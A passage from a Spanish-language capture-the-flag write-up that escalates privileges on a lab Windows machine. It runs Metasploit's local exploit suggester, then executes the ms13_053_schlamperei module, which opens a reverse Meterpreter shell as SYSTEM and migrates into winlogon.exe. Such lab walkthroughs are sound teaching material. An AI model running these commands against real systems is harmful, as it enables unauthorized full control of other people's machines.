[*] 10.10.10.5 - Collecting local exploits for x86/windows...
[*] 10.10.10.5 - 181 exploit checks are being tried...
[+] 10.10.10.5 - exploit/windows/local/bypassuac_eventvwr: The target appears to be vulnerable.
[+] 10.10.10.5 - exploit/windows/local/ms10_015_kitrap0d: The service is running, but could not be validated.
[+] 10.10.10.5 - exploit/windows/local/ms10_092_schelevator: The service is running, but could not be validated.
[+] 10.10.10.5 - exploit/windows/local/ms13_053_schlamperei: The target appears to be vulnerable.
[+] 10.10.10.5 - exploit/windows/local/ms13_081_track_popup_menu: The target appears to be vulnerable.
[+] 10.10.10.5 - exploit/windows/local/ms14_058_track_popup_menu: The target appears to be vulnerable.
[+] 10.10.10.5 - exploit/windows/local/ms15_004_tswbproxy: The service is running, but could not be validated.
[+] 10.10.10.5 - exploit/windows/local/ms15_051_client_copy_image: The target appears to be vulnerable.
[+] 10.10.10.5 - exploit/windows/local/ms16_016_webdav: The service is running, but could not be validated.
[+] 10.10.10.5 - exploit/windows/local/ms16_032_secondary_logon_handle_privesc: The service is running, but could not be validated.
[+] 10.10.10.5 - exploit/windows/local/ms16_075_reflection: The target appears to be vulnerable.
[+] 10.10.10.5 - exploit/windows/local/ntusermndragover: The target appears to be vulnerable.
[+] 10.10.10.5 - exploit/windows/local/ppr_flatten_rec: The target appears to be vulnerable.
[*] Running check method for exploit 41 / 41
[*] 10.10.10.5 - Valid modules for session 1:
============================

 #   Name                                                           Potentially Vulnerable?  Check Result
 -   ----                                                           -----------------------  ------------
 1   exploit/windows/local/bypassuac_eventvwr                       Yes                      The target appears to be vulnerable.
 2   exploit/windows/local/ms10_015_kitrap0d                        Yes                      The service is running, but could not be validated.
 3   exploit/windows/local/ms10_092_schelevator                     Yes                      The service is running, but could not be validated.
 4   exploit/windows/local/ms13_053_schlamperei                     Yes                      The target appears to be vulnerable.
 5   exploit/windows/local/ms13_081_track_popup_menu                Yes                      The target appears to be vulnerable.
 6   exploit/windows/local/ms14_058_track_popup_menu                Yes                      The target appears to be vulnerable.
 7   exploit/windows/local/ms15_004_tswbproxy                       Yes                      The service is running, but could not be validated.
 8   exploit/windows/local/ms15_051_client_copy_image               Yes                      The target appears to be vulnerable.
 9   exploit/windows/local/ms16_016_webdav                          Yes                      The service is running, but could not be validated.
 10  exploit/windows/local/ms16_032_secondary_logon_handle_privesc  Yes                      The service is running, but could not be validated.
 11  exploit/windows/local/ms16_075_reflection                      Yes                      The target appears to be vulnerable.
 12  exploit/windows/local/ntusermndragover                         Yes                      The target appears to be vulnerable.
 13  exploit/windows/local/ppr_flatten_rec                          Yes                      The target appears to be vulnerable.
```
Obviamente no podemos usar todos los Exploits, debemos investigar cada uno para saber cual es el indicado para usar. Después de investigar, nos puede servir el **Exploit ms13_053_schlamperei**, así que vamos a usarlo.

#### Usando Exploit MS13-053 schlamperei {#MS13}

* Cargamos el módulo:
```bash
msf6 post(multi/recon/local_exploit_suggester) > use exploit/windows/local/ms13_053_schlamperei
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
msf6 exploit(windows/local/ms13_053_schlamperei) >
```

* Configuramos el módulo:
```bash
msf6 exploit(windows/local/ms13_053_schlamperei) > set SESSION 1
SESSION => 1
msf6 exploit(windows/local/ms13_053_schlamperei) > set LHOST Tu_IP
LHOST => Tu_IP
```

* Y lo ejecutamos:
```bash
msf6 exploit(windows/local/ms13_053_schlamperei) > exploit
.
[*] Started reverse TCP handler on Tu_IP:4444 
[*] Launching notepad to host the exploit...
[+] Process 4060 launched.
[*] Reflectively injecting the exploit DLL into 4060...
[*] Injecting exploit into 4060...
[*] Found winlogon.exe with PID 440
[+] Everything seems to have worked, cross your fingers and wait for a SYSTEM shell
[*] Sending stage (175686 bytes) to 10.10.10.5
[*] Meterpreter session 2 opened (Tu_IP:4444 -> 10.10.10.5:49161)
.
meterpreter > shell
Process 1068 created.
Channel 1 created.
Microsoft Windows [Version 6.1.7600]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
.
C:\Windows\system32>whoami
whoami
nt authority\system
```
Con esto ya hemos ganado acceso como Administador.

Es posible que falle y no se genere una sesión como **Administrador**, pero el módulo indicara que sí funciono, entonces, si entras a la máquina puedes buscar el **proceso winlogon.exe** y migrar a este para ser **Administrador**.
```bash
meterpreter > ps

Process List
============

 PID   PPID  Name               Arch  Session  User                          Path
 ---   ----  ----               ----  -------  ----                          ----
 0     0     [System Process]
 4     0     System             x86   0
 236   4     smss.exe           x86   0        NT AUTHORITY\SYSTEM           \SystemRoot\System32\smss.exe
 328   308   csrss.exe          x86   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\csrss.exe
 380   308   wininit.exe        x86   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\wininit.exe
 388   372   csrss.exe          x86   1        NT AUTHORITY\SYSTEM           C:\Windows\system32\csrss.exe
 440   372   winlogon.exe       x86   1        NT AUTHORITY\SYSTEM           C:\Windows\system32\winlogon.exe
.
meterpreter > migrate 440
```

Con esto terminamos esta máquina y como mencione antes, prueba si puedes escalar privilegios utilizando Juicy o Rotten Potato.
